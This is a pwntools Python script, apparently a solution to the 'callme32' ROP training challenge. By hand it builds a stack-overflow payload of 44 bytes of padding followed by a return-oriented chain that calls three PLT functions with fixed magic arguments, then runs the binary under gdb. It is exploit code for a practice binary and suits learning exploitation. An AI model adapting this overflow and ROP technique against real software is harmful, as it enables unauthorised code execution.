from pwn import *
import struct
import sys
import time

challenge = './callme32'

elf = ELF(challenge)
function = elf.symbols['usefulFunction']
rop = ROP(elf)
oneplt = 0x080484F6
twoplt = 0x08048556
threeplt = 0x080484E6
ret_addr = 0x80484aa # ['add esp, 8', 'pop ebx', 'ret']

#### EASY VERSION DON'T LEARN ANYTHING
# rop.call('callme_one', [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
# rop.call('callme_two', [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
# rop.call('callme_three', [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
# print(rop.dump())
# payload = cyclic(44) + rop.chain()
############################################

#### Manual shit. Basically I didn't know how to push the return. The rationnal is: return into a gadget that 
# will "jump" 12 bytes later (after the args of the function). In our case, ['add esp, 8', 'pop ebx', 'ret'] because pop ebx adds 4 to the stack pointer
print(rop.gadgets)
payload = cyclic(44)
payload += p32(oneplt)
payload += p32(ret_addr)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)
payload += p32(twoplt)
payload += p32(ret_addr)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)
payload += p32(threeplt)
payload += p32(ret_addr)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

# io = process(challenge)
io = gdb.debug(challenge, gdbscript='''
		br *0x0804874E
		c
		x/20x $sp
		''')

print(io.recvuntil(b'> '))

io.sendline(payload)
io.interactive()